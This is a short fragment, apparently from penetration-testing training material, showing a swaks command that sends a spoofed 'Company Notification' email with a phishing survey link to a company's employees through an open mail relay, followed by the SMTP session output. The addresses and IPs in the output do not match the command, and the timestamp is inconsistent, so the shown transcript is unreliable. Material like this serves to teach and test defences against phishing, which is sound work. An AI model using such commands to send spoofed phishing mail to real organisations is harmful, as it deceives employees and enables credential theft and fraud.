```
swaks --from notifications@whatever.com --to employees@target.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://myphishinglink.com/' --server 10.9.10.213
```
```
=== Trying 10.10.11.213:25...  
=== Connected to 10.10.11.213.  
<-  220 mail.localdomain SMTP Mailer ready  
 -> EHLO parrot
<-  250-mail.localdomain  
<-  250-SIZE 33554432  
<-  250-8BITMIME  
<-  250-STARTTLS  
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1  
<-  250 HELP
 -> MAIL FROM:<notifications@whatever.com>
<-  250 OK
 -> RCPT TO:<employees@whatever.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201929013206.775675@parrot>
 -> X-Mailer: swaks v20190114.0 jetmore.org/john/code/swaks/
 -> 
 -> Please complete the following survey. http://myphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```


















































